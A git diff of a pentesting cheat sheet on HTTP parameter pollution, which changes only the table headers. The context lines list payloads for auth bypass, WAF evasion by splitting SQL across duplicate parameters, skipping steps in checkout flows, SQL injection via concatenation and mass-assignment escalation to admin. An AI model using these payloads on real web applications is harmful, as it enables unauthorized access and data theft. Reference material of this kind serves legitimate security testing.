@@ -22,7 +22,7 @@ linked:
 
 ## Auth / Access Control Bypass
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Differential parser confusion | Frontend WAF reads first param, backend reads second → bypass | Standard. |
 | Auth check on first param | `?user=admin&user=victim` — auth checks `admin`, action on `victim` | Bypass. |
@@ -54,7 +54,7 @@ ___
 
 ## WAF / Filter Bypass via Param Split
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | WAF inspects param value. If value split via duplicate param + concatenation, WAF misses pattern. | ASP.NET specific. |
 | ASP.NET concat | `?q=SELECT&q=*&q=FROM&q=users` → backend gets `SELECT,*,FROM,users` | SQL fragments. |
@@ -91,7 +91,7 @@ ___
 
 ## Logic Flow Manipulation
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | State machine confusion | `?step=1&step=3` → skip step 2 | Skip flow. |
 | Multi-step purchase | `?action=add&action=checkout` | Skip approval. |
@@ -111,7 +111,7 @@ ___
 
 ## SQLi en Hidden Param via Concatenation
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | ASP.NET concat | `?id=1&id=' UNION SELECT * FROM users -- ` | Backend receives `1,' UNION SELECT...`. |
 | Escape single quote | If first param contains escape, second injects | Edge. |
@@ -130,7 +130,7 @@ ___
 
 ## Mass Assignment Combo
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Body con duplicate field | `name=test&isAdmin=false&isAdmin=true` | If last wins → admin. |
 | Override sensitive field | First "safe" value, second "evil" value | Direct. |
